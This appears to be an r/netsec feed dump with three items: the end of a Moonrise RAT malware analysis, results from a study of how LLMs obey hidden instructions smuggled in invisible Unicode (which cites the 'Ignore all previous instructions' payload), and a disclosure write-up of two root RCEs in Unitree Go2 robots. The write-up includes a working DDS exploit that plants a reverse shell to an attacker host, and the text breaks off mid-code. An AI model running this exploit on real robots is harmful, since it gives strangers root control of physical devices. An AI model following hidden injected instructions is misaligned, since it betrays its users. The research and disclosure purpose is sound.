malware’s observed behaviour specifically targets port 8765, where the WebSocket-based C2 communications occur.</p><p>Browsing to the IP returned a website for the community Linux distribution ShefOS. Based on the available evidence, there is no direct indication that the website itself is malicious or intentionally distributing Moonrise. A more likely explanation is that this IP belongs to a shared VPS / hosted server, where benign web content on ports 80/443 coexists with a separate service bound to port 8765 and used for C2 traffic.</p><h2>Dynamic analysis via ANYRUN</h2><p>ANYRUN network stream analysis shows a post-connection event: a large JSON message transmitted over the active channel includes a file_upload command with a fileData field containing base64-encoded content. This is a useful pivot point because it demonstrates that the operation is not limited to simple command execution or telemetry collection. The operator appears able to transfer files or scripts through the same session, which materially increases the malware’s operational flexibility.</p><p>After decoding the base64 content, the payload resolves to a Windows batch script that launches winws.exe alongside a large set of traffic filtering and desynchronisation parameters. The script references components associated with the Zapret project, a censorship and network restriction bypass toolkit commonly used to interfere with deep packet inspection (DPI) and protocol filtering.</p><p>In practical terms, this suggests the operator is delivering additional tooling to manipulate network traffic behaviour on the infected host, potentially to improve reachability to blocked services or to evade network-level controls.</p><p>The decoded batch file includes logic that invokes winws.exe with multiple TCP and UDP filters, covering common and alternative service ports. The script explicitly references traffic on TCP ports including 80 (HTTP), 443 (HTTPS), and several alternative TLS ports such as 2053, 2083, 2087, 2096, and 8443, alongside UDP port 443 (QUIC) and additional UDP ranges.</p><p>It also includes parameters consistent with DPI desynchronisation techniques, including fake handshake generation, packet splitting patterns, repeated crafted packets, and protocol-specific evasion options.</p><p>From an operator tradecraft perspective, this is an interesting finding because it indicates the intrusion may involve modular capability delivery beyond the initial Moonrise client. Rather than embedding every feature into the primary binary, the actor can push environment-specific tooling after execution. That approach reduces initial payload size, allows rapid reconfiguration, and gives the operator freedom to adapt to the victim’s network restrictions in real time.</p><p>From analysis, Moonrise’s surveillance-focused code paths point to a malware family built for persistent, operator-led control rather than simple automated execution. The evidence suggests a structured workflow: commands are received over a live WebSocket session, task data is parsed into JSON-backed objects, and results are returned in an organised format for the operator.</p><p>When that is combined with keylogging-related command handling, historical result packaging, clipboard monitoring artefacts, and fields consistent with cryptocurrency address theft, Moonrise looks far closer to a hands-on surveillance and theft platform than a basic commodity implant.</p><h2 data-start=\"2865\" data-end=\"2936\">How Evalian’s SOC Detects and Responds to Threats Like Moonrise</h2><p data-start=\"2938\" data-end=\"3169\">Moonrise demonstrates how modern remote access trojans are evolving: persistent WebSocket command-and-control, structured JSON tasking, live surveillance features and crypto-focused theft capability, all without heavy obfuscation.</p><p data-start=\"3171\" data-end=\"3250\">Our CREST accredited Security Operations Centre is built to detect exactly this class of threat.</p><ul data-start=\"3265\" data-end=\"3649\"><li data-start=\"3265\" data-end=\"3380\"><p data-start=\"3267\" data-end=\"3380\">Deep network telemetry analysis to identify long-lived outbound WebSocket sessions to suspicious infrastructure</p></li><li data-start=\"3381\" data-end=\"3495\"><p data-start=\"3383\" data-end=\"3495\">Endpoint behavioural monitoring to detect keylogging, clipboard manipulation and unauthorised process activity</p></li><li data-start=\"3496\" data-end=\"3571\"><p data-start=\"3498\" data-end=\"3571\">Threat hunting across structured C2 patterns and anomalous JSON traffic</p></li><li data-start=\"3572\" data-end=\"3649\"><p data-start=\"3574\" data-end=\"3649\">Rapid containment and forensic investigation when a compromise is confirmed</p></li></ul><p data-start=\"3651\" data-end=\"3913\">Whether you need continuous monitoring, proactive threat hunting, or full incident response following suspected credential or financial compromise, our SOC team provides the technical depth and operational maturity required to manage complex, real-world attacks.</p><p data-start=\"3915\" data-end=\"4112\">If you want to understand whether your environment could detect a WebSocket-based surveillance implant like Moonrise, we can help you assess and strengthen your controls before it becomes a breach.</p>","contentLength":22630,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rfkiwy/new_malware_moonrise_analysis/"},{"title":"Reverse CAPTCHA: Evaluating LLM Susceptibility to Invisible Unicode Instruction Injection","url":"https://www.moltwire.com/research/reverse-captcha-zw-steganography","date":1772133697,"author":"/u/thecanonicalmg","guid":154196,"unread":true,"content":"<h3>3.1 Tool Use Is the Primary Amplifier</h3><p>The single largest finding: <strong>tool access transforms invisible Unicode from an ignorable artifact to a decodable instruction channel.</strong></p><div><svg viewBox=\"0 0 720 370\" xmlns=\"http://www.w3.org/2000/svg\"></svg></div><p>Without tools, all models resist hidden instructions at high rates (0.1–16.9% compliance). With tools enabled, compliance increases dramatically — Claude Haiku jumps from 0.8% to 49.2% (odds ratio 115.1, Cohen's h = 1.37). Models write Python code to decode the invisible characters, converting the task from pattern recognition to string manipulation.</p><h3>3.2 Provider-Specific Encoding Preferences</h3><p>A striking discovery: <strong>encoding vulnerability is provider-specific.</strong></p><div><svg viewBox=\"0 0 720 330\" xmlns=\"http://www.w3.org/2000/svg\"></svg></div><p>GPT-5.2 achieves 69–70% on zero-width binary (hint_full) but near-zero on Unicode Tags. Claude Opus achieves  on Tags (codepoints and full hints) but only 48–68% on zero-width binary. This likely reflects differences in tokenizer design. <strong>An attacker must tailor their encoding to the target model's provider.</strong></p><div><svg viewBox=\"0 0 720 380\" xmlns=\"http://www.w3.org/2000/svg\"></svg></div><p>Chi-squared tests confirm that scheme significantly affects compliance for every model (p &lt; 10⁻⁷ for all). The gradient is consistent: <strong>unhinted &lt;&lt; codepoint hints &lt; full hints.</strong></p><p>No model decodes either encoding when unhinted. With tools but no hints, compliance remains near-zero (0–11%), indicating that tool access alone is insufficient. <strong>The critical enabler is the combination of tool access and decoding instructions.</strong></p><p>The adversarial \"Ignore all previous instructions\" payload has model-dependent effects:\n</p><li>: Injection  compliance (Opus: 32.0% to 23.9%, p=0.004; GPT-5.2: 11.8% to 6.1%, p=0.002), suggesting training against explicit injection language</li><li>: Injection  compliance (43.7% to 59.6%, p&lt;0.001)</li><li>: No significant difference (p=0.058)</li><h3>3.5 Pairwise Model Comparisons</h3><p>All 10 pairwise comparisons are statistically significant after Bonferroni correction (p_corrected &lt; 0.05). Overall compliance ranking (tools ON):</p><p><strong>Sonnet (47.4%) &gt; Opus (30.1%) &gt; Haiku (25.0%) &gt; GPT-5.2 (10.3%) &gt; GPT-4o-mini (0.9%)</strong></p><p>Largest effect: Sonnet vs GPT-4o-mini (Cohen's h = 1.33, OR = 103.8).</p>","contentLength":2017,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rfjlyh/reverse_captcha_evaluating_llm_susceptibility_to/"},{"title":"From DDS Packets to Robot Shells: Two RCEs in Unitree Robots (CVE-2026-27509 & CVE-2026-27510)","url":"https://boschko.ca/unitree-go2-rce/","date":1772133542,"author":"/u/WiseTuna","guid":154197,"unread":true,"content":"<p>This is a lengthy technical write-up of CVE-2026-27509 and CVE-2026-27510, found alongside <a href=\"https://x.com/ruikai?ref=boschko.ca\" rel=\"noreferrer\">@Ruikai,</a> founder of <a href=\"https://pwno.io/?ref=boschko.ca\" rel=\"noreferrer\">Pwn0</a>. We both threw in cash for the robot, and I invaded his living space for seven days of chipotle-fueled hacking. Regardless of who found what, we’ll be reporting everything together. Keep an eye on his <a href=\"https://retr0.blog/?ref=boschko.ca\" rel=\"noreferrer\">blog</a> for deep technical write-ups on the other vulnerabilities we found. </p><p>The blog is split into two parts that build on each other. Part one covers CVE-2026-27509, the unauthenticated RCE as root on V1.1.7, achieved by abusing the <code>rt/api/programming_actuator/*</code> DDS DataWriter to execute arbitrary Python. Part two, CVE-2026-27510, takes what we learned and introduces a new exploit primitive targeting the same  in V1.1.11, this time by tampering with the <a href=\"https://developers.google.com/blockly?ref=boschko.ca\" rel=\"noreferrer\">Blockly</a> preprogrammed action blocks stored in the Android app's local database.</p><p>Both PoCs are triggered by pressing a keybinding on the physical controller. That was a goal of ours and made buying the $400 controller feel worth it 😭. More importantly, the controller trigger makes the RCE persistent. </p><p><a href=\"https://www.unitree.com/?ref=boschko.ca\" rel=\"noreferrer\">Unitree</a> (<em>Hangzhou Yushu Technology Co., Ltd</em>. 杭州宇树科技有限公司) is a Chinese developer of advanced consumer and commercial robots, founded in 2016 and based in Hangzhou, China. The company is known for its high‑performance quadrupedal robots (robot dogs) and, more recently, for affordable humanoids such as the <a href=\"https://www.unitree.com/R1?ref=boschko.ca\" rel=\"noreferrer\">R1</a> and the <a href=\"https://www.unitree.com/g1?ref=boschko.ca\" rel=\"noreferrer\"> Robot (G1)</a>.</p><p>Unitree was recently in the spotlight for their humanoid robots performing an advanced martial arts routine at China's 2026 Lunar New Year Gala.</p><p>Unitree has been publicly advancing plans toward an IPO on Shanghai's STAR Market, targeting a valuation of around ¥50 billion (~$7 billion). As of a few weeks ago, Unitree humanoid robots were made available for direct purchase through Amazon.</p><blockquote>Unitree is clearly working to rebuild trust with the security community after the <a href=\"https://github.com/Bin4ry/UniPwn?ref=boschko.ca\" rel=\"noreferrer\">Unipwn</a> incident. They have since gone live with their <a href=\"https://security.unitree.com/?ref=boschko.ca\" rel=\"noreferrer\">Security Response Center</a>. Despite being stretched extremely thin (they need more dedicated security headcount IMHO), their teams  responded promptly and respected our work as security researchers. Notably, \"Ixonz\" from their security team deserves a special shoutout for going above and beyond, being responsive, &amp; professional throughout disclosure. </blockquote><ul><li>October 24, 2025 — Received the Unitree G02 robot.</li><li>October 26, 2025 — Discovered the DDS vulnerability on firmware V1.1.7 🎉</li><li>October 27, 2025 — Drafted the initial technical blog detailing the PoC and findings.</li><li>October 29, 2025 — Contacted Unitree at  to ask for the proper channels for responsible disclosure.</li><li>October 30, 2025 — Unitree security responded, we shared technical details and a demo video, and they asked us to validate the PoC on V1.1.11.</li><li>October 30, 2025 — The original V1.1.7 PoC no longer worked on V1.1.11 due to suppressed DDS topics.</li><li>October 30, 2025 — Discovered the local database modification RCE leveraging the same underlying vulnerable code that achieved RCE on V1.1.11 🎉</li><li>November 03, 2025 — Submitted evidence for the V1.1.11 RCE to Unitree, including a demo video and POC code to assist with validating V1.1.7.</li><li>November 07, 2025 — Unitree replied, validating the DDS exposure &amp; accessibility of DDS topics on v1.1.7 and v1.1.11 ().</li><li>November 06, 2025 — The technical report was shared outside of Unitree, without our consent, and was unknowingly  on X by a researcher at a Chinese security lab ☹️.</li><li>November 07, 2025 — We informed Unitree that the unindexable, unsitemapped, tagged, tracked, custom URL provided exclusively to them had somehow been redistributed without our knowledge. It was taken down, and communication moved from Email to Telegram. </li><li>November 07, 2025 — The researcher on X was contacted &amp; the tweet removed. (We believe this was an honest mistake. Regardless, they should not have had access to the link.)</li><li>November 10, 2025 — The Unitree security team validated &amp; reproduced the DDS exploit on versions V1.1.7-V1.1.11 EDU.</li><li>November 18, 2025 — The Unitree security team validated &amp; reproduced the mobile DB modification that led to RCE, affecting at minimum version V1.1.7-V1.1.11.</li><li>December 30, 2025 — Follow-up and 60-day disclosure notice. Unitree's security team mentioned they had pushed a fix for CVE-2026-27510. We did retest. A Fix for CVE-2026-27510 was mentioned to be in progress.</li><li>January 5, 2026  —  Attempted to reserve CVE through a CNA.</li><li>February 20, 2026 —  Reached out to <a href=\"https://www.vulncheck.com/?ref=boschko.ca\" rel=\"noreferrer\">VulnCheck</a> to obtain CVEs &amp; two were reserved within hours. Unitree was notified the same day, along with the date of intended publication.</li><li>February 24, 2026 — Unitree pushed OTA patches in V1.1.13 to address CVE-2026-27510 &amp;&nbsp;they've implemented strict review criteria's to vet uploaded scripts. </li><li>February 27, 2026 —  Publishing blog 🎉</li></ul><p>The following firmware versions of the Unitree Go2 (AIR) are confirmed vulnerable:</p><ul><li>CVE-2026-27509:  V1.1.7, V1.1.8, V1.1.9, V1.1.11 (EDU) </li><li>CVE-2026-27510: V1.1.7, V1.1.8, V1.1.9, V1.1.11</li></ul><p>Versions 1.0.24, 1.0.25, 1.1.1, 1.1.2, 1.1.3, and 1.1.4 may also be affected, as well as other Unitree products not listed here. <u>This is not an exhaustive list</u> &amp; we did not have access to every firmware version or hardware model.</p><p>Per our communications with Unitree's security team, patches have been pushed as part of V1.1.13. CVE-2026-27509 will likely not be addressed in EDU versions due to the nature and requirements of that offering, though this is subject to change. Unitree may also release their own advisory.</p><p>We didn't start from scratch. <a href=\"https://wiki.theroboverse.com/?ref=boschko.ca\" rel=\"noreferrer\">RoboVerse</a> is an active community focused on developing and reversing Unitree robots. We used their V1.1.7 jailbreak and <a href=\"https://github.com/legion1581/go2_firmware_tools/tree/1.1.x?ref=boschko.ca\" rel=\"noreferrer\">legion1581’s recovery script</a> to flash the firmware onto our Go2. This version lets us gain SSH access using the <a href=\"https://github.com/Bin4ry/UniPwn?ref=boschko.ca\" rel=\"noreferrer\">UniPwn</a> exploits, giving us a root shell so we can begin analyzing and reversing our Go2.</p><p>This was necessary because the UART RX pin is disabled in U-Boot, preventing access to the CLI. This was easiest for us, we had just received the robot &amp; weren’t feeling too frisky about unsoldering components or messing with the MCU.</p><blockquote>This created uncertainty when reporting to the Unitree security team, as we couldn't definitively distinguish between vulnerabilities present in stock firmware versus those potentially introduced by patched/jailbroken binaries.</blockquote><p>Upon getting a shell, we quickly discovered that certain memory-intensive processes were Python. </p><p> stood out &amp; the name suggests functionality for uploading and executing code. Actuators take actions, so it wasn’t unreasonable to assume that  might accept user programs and execute them to control the robot’s behavior.</p><p>Looking at the first few lines of  we see a lot of imports for . That seems like a good place to start.</p><p>DDS is basically a smart message bus. Instead of components calling each other directly via an API, they publish messages to , and interested components subscribe to those topics.</p><p>Imagine DDS as awhere publishers are radio stations transmitting on specific frequencies (topics), and subscribers are radios tuned to those frequencies. Nobody needs to know who's listening or who's broadcasting; they just need to agree on the frequency. Every application joins a D which is like a VLAN for DDS.  are named typed messaging channels. Below are a few examples from the Go2.</p><p>When a participant joins a DDS domain, it discovers other participants via multicast. Publishers (responsible for publishing data by creating different DataWriters to publish specific types of data to different Topics) and Subscribers (responsible for subscribing to and receiving data by creating different DataReaders to subscribe to different data types) write/read messages to Topics. However, the publisher doesn't know who's subscribed, and subscribers don't know who's publishing. They just agree on the topic name and data type and a strict QOS policy defines the message delivery guarantees. </p><p>Using the <code>cyclonedds ps -t \"rt/programming_actuator/\"</code> on the robot, we can inspect the DDS participants and topics related to the programming actuator service. This command displays the participant information, Quality of Service (QoS) settings, topic details, and publication information for any topics matching the specified filter.</p><p>The domain participant ID is <code>011061b6-af41-e839-23d1-e36a000001c1</code> and it has a few properties defined for it. The participant's QoS liveliness lease duration is 10 seconds. The topic is <code>rt/programming_actuator/response</code> and this participant has a Publisher (DataWriter) on the topic with the writer GUID of <code>011061b6-af41-e839-23d1-e36a00000203</code>. Currently, there are no subscribers shown for this topic in this output. </p><p>DDS has no built-in authentication in the  configuration. The DDS Security specification (DDS-Sec) exists, but it's not implemented on the Unitree Go2. Therefore, any device on the network can join  and participate in DDS communication without credentials. The actual message structure for this would resemble the following.</p><pre><code>Request_ {\n    RequestHeader_ header {\n        RequestIdentity_ identity {\n            int64 id;        // Unique request identifier\n            int32 api_id;    // Operation ID (1002 = send_program)\n        }\n        RequestLease_ lease {\n            int32 id;        // Lease identifier (unused)\n        }\n        RequestPolicy_ policy {\n            int32 priority;  // Message priority\n            bool noreply;    // Whether response is expected\n        }\n    }\n    string parameter;        // JSON-encoded payload\n    sequence&lt;uint8&gt; binary;  // Binary data (unused)\n}</code></pre><p>DDS uses RTPS (Real-Time Publish-Subscribe), which operates primarily over UDP multicast. During discovery, we send out RTPS discovery packets over UDP multicast to announce our participant, and then listen for other participants' announcements (via UDP multicast on the discovery endpoints). These discovery messages advertise available topics, DataWriters, and DataReaders. Once discovery completes, the actual data exchange happens via unicast between matched endpoints. We were able to retrieve the topic data on version V1.1.7. These are all the topics we can subscribe to.</p><p>On V1.1.7 firmware, the following topics would be available for subscription. </p><pre><code>[*] Joining DDS domain 0...\n[*] Discovering topics from robot at 192.168.123.161...\n\n1761841554.188194 [0]    6956286: config: //CycloneDDS/Domain/General: 'NetworkInterfaceAddress': deprecated element (CYCLONEDDS_URI+0 line 4)\n\n[+] Found 67 active topics:\n    → rt/api/assistant_recorder/request\n    → rt/api/assistant_recorder/response\n    → rt/api/audiohub/request\n    → rt/api/audiohub/response\n    → rt/api/bashrunner/request\n    → rt/api/bashrunner/response\n    → rt/api/config/request\n    → rt/api/config/response\n    → rt/api/fourg_agent/request\n    → rt/api/fourg_agent/response\n    → rt/api/gas_sensor/request\n    → rt/api/gesture/request\n    → rt/api/gpt/request\n    → rt/api/gpt/response\n    → rt/api/motion_switcher/request\n    → rt/api/motion_switcher/response\n    → rt/api/obstacles_avoid/request\n    → rt/api/obstacles_avoid/response\n    → rt/api/pet/request\n    → rt/api/pet/response\n    → rt/api/programming_actuator/request\n    → rt/api/programming_actuator/response\n    → rt/api/robot_state/request\n    → rt/api/robot_state/response\n    → rt/api/sport/request\n    → rt/api/sport/response\n    → rt/api/sport_lease/response\n    → rt/api/uwbswitch/request\n    → rt/api/uwbswitch/response\n    → rt/api/videohub/request\n    → rt/api/videohub/response\n    → rt/api/vui/request\n    → rt/api/vui/response\n    → rt/arm_Command\n    → rt/audiohub/player/state\n    → rt/config_change_status\n    → rt/frontvideostream\n    → rt/gesture/result\n    → rt/gnss\n    → rt/gpt_cmd\n    → rt/gptflowfeedback\n    → rt/lf/lowstate\n    → rt/lf/sportmodestate\n    → rt/lowcmd\n    → rt/lowstate\n    → rt/multiplestate\n    → rt/pet/flowfeedback\n    → rt/programming_actuator/command \n    → rt/public_network_status\n    → rt/qt_add_edge\n    → rt/qt_add_node\n    → rt/qt_command\n    → rt/rtc/state\n    → rt/rtc_status\n    → rt/selftest\n    → rt/servicestate\n    → rt/servicestateactivate\n    → rt/sportmodestate\n    → rt/uslam/client_command\n    → rt/uslam/cloud_map\n    → rt/uslam/server_log\n    → rt/utlidar/cloud\n    → rt/utlidar/cloud_base\n    → rt/utlidar/cloud_deskewed\n    → rt/utlidar/grid_map\n    → rt/utlidar/height_map\n    → rt/utlidar/height_map_array</code></pre><p>We'll come back to this during PoC phase.</p><p>You can find nice high-level architecture overviews of the Go2 <a href=\"https://wiki.theroboverse.com/en/about?ref=boschko.ca\" rel=\"noreferrer\">here</a>. The Unitree Go2 has two main network interfaces (different physical/virtual nets) with distinct IPs.</p><ul><li> at  is the robot's internal services network</li><li> at  is the robot's external network (this may change depending on your network)</li></ul><p>In our setup, the robot obtains an external-facing IP on the same LAN as the attacker (), while  remains the robot’s internal interface where  listens.</p><p>DDS discovery uses multicast for the initial “” phase. That multicast announcement is visible across interfaces, so when our attacker joins DDS , the robot’s network stack forwards the multicast to the internal interface and  replies “<em>Hey, I’m subscribed to !</em>”</p><p>However, after discovery, DDS switches to unicast UDP for actual data transfer. The attacker () then tries to send payloads directly to , but there is no route from the attacker into the robot’s internal  network. The robot’s internal network is isolated and not routable from the attacker’s interface by default, so the exploit traffic never reaches . If the Go2 is connected to the router or to the attacker's machine, adding a route is the simplest fix <code>sudo route add -net 192.168.123.0/24 192.168.1.7</code>. This tells the attacker’s host how to reach  via the robot’s external IP and lets the unicast DDS data reach .</p><p>If adding a route is not possible or desirable, CycloneDDS supports explicit peer configuration. In the CVE-2026-27509 PoC we instruct the DDS client to connect directly to the internal address (), bypassing normal routing and any multicast/unicast mismatch:</p><pre><code>os.environ['CYCLONEDDS_URI'] = '''&lt;CycloneDDS&gt;\n  &lt;Domain id=\"0\"&gt;\n    &lt;General&gt;\n      &lt;NetworkInterfaceAddress&gt;en5&lt;/NetworkInterfaceAddress&gt;\n    &lt;/General&gt;\n    &lt;Discovery&gt;\n      &lt;Peers&gt;\n        &lt;Peer address=\"192.168.123.161\"/&gt;\n      &lt;/Peers&gt;\n    &lt;/Discovery&gt;\n  &lt;/Domain&gt;\n&lt;/CycloneDDS&gt;'''</code></pre><p><u>This is purely a client-side configuration</u>. The robot's DDS service accepts connections from any peer (because authentication is disabled), so once our DDS client finds the right network path, the connection gets established. CycloneDDS handles the low-level network plumbing so the client can communicate directly with the internal service address.</p><h2>The Vulnerability in </h2><p>I won't be re-uploading Unitree's code. You can grab it yourself from the latest jailbroken rootfs in this <a href=\"https://disk.yandex.com/d/9cjTdkCc_MvnRw?ref=boschko.ca\" rel=\"noreferrer\">Yandex Drive</a>.  serves as an orchestrator for tasking and mapping saved script's containing sequential robot actions. This script is assigned to one of three controller button combinations. Upon activation, it dispatches a pre-programmed action sequence for the Go2 robot to perform.</p><h3>1. Unauthenticated DDS Topic Access</h3><p>The critical security assumption is that all participants on the DDS network are trusted. Therefore, there's no authentication mechanism to verify who's joining the network or publishing DDS messages.</p><p>This creates a DDS topic for receiving programming requests and a DataReader (subscriber) that listens for messages. The DDS subscriber is listening to the topic <code>rt/api/programming_actuator/request</code>. Any device that can join DDS  can publish messages to this topic, and the robot will blindly accept and process them. The only caveat when building our exploit is that the DDS QoS settings  what the robot expects. If they don't, messages are silently dropped.</p><h3>2. Missing Authorization Check</h3><p>Once you can send DDS \"messages\" to the robot, the next question is \"<em>What can you tell it to do?</em>\". The  service provides a few functions in the way of an  found in the message header (it's not really an API, I'll just call it an API from now on). It's more of a pseudo-function selector.</p><p>The code routes messages to handlers based solely on the  value, without ever checking if the sender has permission to invoke that function. The code essentially says \"<em>You specified ? Okay, let me upload your code!</em>\"</p><p>Authentication and authorization issues aside, this upload 'API' should at least validate the code it's accepting. Instead,  accepts arbitrary Python code as a string and writes it straight to disk without any validation.</p><p>When the robot receives a message with , it routes to the code upload handler &amp; the robot will parse the JSON payload.</p><p>This is what allows us to define a controller shortcut that triggers an actuator.</p><pre><code>chunk_content = ''  # &lt;-- hold the malicious code\nprogram_uuid = ''   # &lt;-- become the filename\nbind_hotkey = ''    # &lt;-- what controller button to bind to</code></pre><p>Ironically, the robot performs exactly one validation check, confirming that a field parameter exists. The actual content of that parameter is never examined. It will also later perform a hotkey validation because the only hotkeys allowed are , , whose states are set in <code>/unitree/etc/programming/hotkey_list.txt</code></p><p>The robot then validates the  (not the content).</p><p>This part is  interesting. Unitree designed this API to support large programs split across multiple chunks (like uploading a 50KB program in 5x 10KB pieces). But the implementation is broken. This is super convenient for us.</p><p>Only  is ever processed. If we send , ,  they're all getting ignored. It's only checking if chunk 1 is stored. So, from a payload/exploit perspective, we can send everything in a single chunk by setting  and  which is very simple and reliable.</p><p>Once sent, the robot stores our malicious code in memory via <code>hotkey_manager.add_program_cache(chunk_content)</code> (line 276), but it's not on disk yet. </p><p>Looking at line 279, we see that when all chunks are received (in our case, just chunk 1), the code checks <code>if chunk_index == total_chunk_num:</code> and triggers <code>hotkey_manager.update_hotkey_list(bind_hotkey, program_uuid)</code>. This transitions us to looking at .</p><h3>4. Arbitrary File Write as Root</h3><p>After accepting the malicious code, the robot needs to store it somewhere. The  module handles this, writing the code to a  file in <code>/unitree/etc/programming/</code>.</p><p> handles a lot, such as deleting the old program file.</p><p>And creating our new program file. I'll mention it in passing, but there is a path traversal in the path construction if the  is something like <code>../../../../tmp/something</code>. There's more going on here, but it's not important for our exploit. </p><p>To further understand the code above, we must know where  and  comes from. Remember  stores our code in memory via <code>hotkey_manager.add_program_cache(chunk_content)</code> and  defines  as <code>/unitree/etc/programming/</code>.</p><p>There are a lot more bugs here that are not related to CVE-2026-27509. After writing the file, the robot sends a success response.</p><h3>5. Persistent Hotkey Binding</h3><p>The robot binds the uploaded python saved to disk to a controller keybinding. This binding is stored in a text file, creating a persistent . </p><p>This survives the reboot because the file is read when  starts up as defined in  of 's . The in-memory mapping is fetched from . From this point on, whenever the robot powers on, something like this persists (assuming our file is called )</p><pre><code>root@Unitree:/unitree/etc/programming# cat hotkey_list.txt\nL1+Y None\nL2+Y None\nR1+Y revshell</code></pre><p>When the Go2 powers on,  starts and loads . It sees that  is bound to  which acts like a pointer to our DDS uploaded Python script stored at <code>/unitree/etc/programming/</code>. When  is pressed,  is triggered to run.</p><h3>6. Uncontrolled Root Execution</h3><p>Execution of  happens in two parts: detecting the button press, and spawning the program.</p><p>No restrictions, no timeouts, no resource limits. The only check is preventing two scripts from running simultaneously. Beyond that,  is passed directly to  and executed as root... no sanitization, no questions asked. 👍</p><h2>Remote Code Execution in Version 1.1.7 (CVE-2026-27509)</h2><p>A POC was written to exploit those issues &amp; affects versions V1.1.7 through sometime before V1.1.11. However, the V1.1.11 EDU variant of the Unitree Go2 remains vulnerable. </p><p>Here's what the attack chain looks like from the victim's perspective once the PoC is run.</p><pre><code>1. Attacker runs POC targetting victim Go2 \n                       ↓\n2. Victim presses R1+Y on physical controller\n                       ↓\n3. Controller sends DDS message on \"rt/wirelesscontroller\" topic\n                       ↓\n4. physical_remote_control_key_monitoring() receives message\n                       ↓\n5. Calls process_btn_type(hotkey_manager, BtnType.R1ANDY)\n                       ↓\n6. Looks up program UUID for \"R1+Y\" → finds \"revshell\"\n                       ↓\n7. Constructs path → /unitree/etc/programming/revshell.py\n                       ↓\n8. Spawns thread → run_script('/unitree/etc/programming/revshell.py')\n                       ↓\n9. subprocess.Popen(['python3', 'revshell.py'])\n                       ↓\n10. Code gets executed, attacker listener catches the reverse shell</code></pre><p>To run the PoC, you'll need <a href=\"https://github.com/eclipse-cyclonedds/cyclonedds?ref=boschko.ca\" rel=\"noreferrer\">CycloneDDS</a> which was a pain in my asshole to get working. I recommend using a Debian-based machine. The PoC includes some abstraction provided by the <a href=\"https://github.com/unitreerobotics/unitree_sdk2_python?ref=boschko.ca\" rel=\"noreferrer\">unitree_sdk2_python</a> project. <strong>Immense props &amp; respect to those guys </strong>👏. </p><p>Our DDS messages must conform to a specific data structure defined by Unitree in IDL files. That SDK converts them to Python classes for us. I should mention that you don't  to use the repo... You can use the standalone IDL files with a bit of finagling. I simply don't want to explain everything. To run the POC setup the following environment:</p><pre><code>sudo apt install -y python3.12 python3.12-venv &amp;&amp; \\\npython3.12 -m venv py312_venv &amp;&amp; \\\nsource py312_venv/bin/activate \n\nsudo apt update\nsudo apt install -y git cmake build-essential pkg-config libssl-dev liblttng-ust-dev\n\ngit clone https://github.com/eclipse-cyclonedds/cyclonedds.git\ncd cyclonedds &amp;&amp; mkdir build &amp;&amp; cd build\ncmake .. -DCMAKE_INSTALL_PREFIX=/usr/local\nmake -j$(nproc)\nsudo make install\n\ngit clone https://github.com/unitreerobotics/unitree_sdk2_python.git\ncd unitree_sdk2_python\npip3 install -e .</code></pre><p>Before we run the POC we'll first validate that no controller bindings have been created and no additional files exist in  besides  and .</p><p>The actuator service will run as root by default on boot. To gain better visuals of what is going on under the hood, we've killed it and ran it  ourselves.</p><p>To make documenting the exploit , we connected the robot directly to the router via Ethernet and added routes on our attacker machine to reach the Go2's network through its external IP. </p><pre><code>sudo route add -net 192.168.123.0/24 192.168.1.7\n(192.168.1.2) at 96:94:f7:af:82:d2 on en0 Attacker IP\n(192.168.1.7) at 7e:1d:75:60:f5:89 on en0 Robot IP (wlan0)</code></pre><p>With these routes set CycloneDDS's explicit peer configuration takes care of the rest. </p><p>The Go2's on-device access point is another valid entry point. Our PoC sidesteps it by connecting the robot directly to our network, keeping the RCE unauthenticated. In the wild, the access point is the more realistic vector where the Go2 network is auth-gated only by a broadcasted password protected SSID. There's also a more involved setup via a direct Ethernet connection from the attacker's PC to the robot, but that's a lot to get into 💀.</p><p>Below is the POC that achieves RCE on Unitree Go2 via DDS on V1.1.7 and V1.1.11 EDU.</p><pre><code>#!/usr/bin/env python3\nimport sys\nimport json\nimport os\nimport time\nfrom cyclonedds.domain import DomainParticipant\nfrom cyclonedds.topic import Topic\nfrom cyclonedds.pub import DataWriter\nfrom cyclonedds.sub import DataReader\nfrom cyclonedds.core import Qos, Policy\nfrom cyclonedds.util import duration\nfrom unitree_sdk2py.idl.unitree_api.msg.dds_ import (\n    Request_, RequestHeader_, RequestIdentity_, RequestLease_, RequestPolicy_, Response_\n)\n\n# inline DDS config \nos.environ['CYCLONEDDS_URI'] = '''&lt;CycloneDDS&gt;\n  &lt;Domain id=\"0\"&gt;\n    &lt;General&gt;\n      &lt;NetworkInterfaceAddress&gt;auto&lt;/NetworkInterfaceAddress&gt;\n    &lt;/General&gt;\n    &lt;Discovery&gt;\n      &lt;Peers&gt;\n        &lt;Peer address=\"192.168.123.161\"/&gt;\n      &lt;/Peers&gt;\n    &lt;/Discovery&gt;\n  &lt;/Domain&gt;\n&lt;/CycloneDDS&gt;'''\n\n# change this to ur machine\nLHOST = \"192.168.1.2\"\nLPORT = 4444\n\n# rs payload\nrevshell_code = f\"\"\"\nimport socket\nimport subprocess\nimport os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('{LHOST}', {LPORT}))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/bash', '-i'])\n\"\"\"\n\ndp = DomainParticipant(0)\n\n# pain in my asshole\nqos = Qos(\n    Policy.Reliability.BestEffort,\n    Policy.Durability.Volatile,\n    Policy.History.KeepLast(depth=1)\n)\n\nwriter = DataWriter(dp, Topic(dp, 'rt/api/programming_actuator/request', Request_, qos=qos))\nreader = DataReader(dp, Topic(dp, 'rt/api/programming_actuator/response', Response_))\n\ntime.sleep(5)\n\nreq_id = int(time.time() * 1000)\n\npayload = {\n    \"program_content\": {\n        \"chunk_index\": 1,\n        \"total_chunk_num\": 1,\n        \"chunk_content\": revshell_code\n    },\n    \"program_uuid\": \"revshell\",\n    \"bind_hotkey\": \"R1+Y\" \n}\n\nreq = Request_(\n    header=RequestHeader_(\n        identity=RequestIdentity_(id=req_id, api_id=1002),\n        lease=RequestLease_(id=0),\n        policy=RequestPolicy_(priority=0, noreply=False)\n    ),\n    parameter=json.dumps(payload),\n    binary=b\"\"\n)\n\nwriter.write(req)\nprint(f\"sent revshell payload (id={req_id})\")\nprint(f\"connects back to {LHOST}:{LPORT}\")\n\ntimeout = time.time() + 5\ngot_response = False\n\nwhile 